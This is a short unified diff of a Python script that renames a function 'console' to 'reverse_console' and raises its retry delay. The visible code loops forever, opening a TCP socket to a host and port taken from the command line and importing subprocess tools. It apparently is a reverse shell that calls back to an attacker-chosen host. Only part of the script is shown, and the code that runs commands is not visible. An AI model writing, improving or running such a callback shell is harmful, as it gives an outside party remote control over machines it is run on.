@@ -4,7 +4,7 @@ from time import sleep
 from subprocess import Popen, PIPE
 from socket import socket, AF_INET, SOCK_STREAM
 
-def console(h, p, w=16):
+def reverse_console(h, p, w=60):
     while 6:
         try:
             C = socket(AF_INET, SOCK_STREAM)
@@ -22,4 +22,4 @@ def console(h, p, w=16):
 
 if __name__ == "__main__":
     import sys
-    console(*sys.argv[1].split(":"))
+    reverse_console(*sys.argv[1].split(":"))
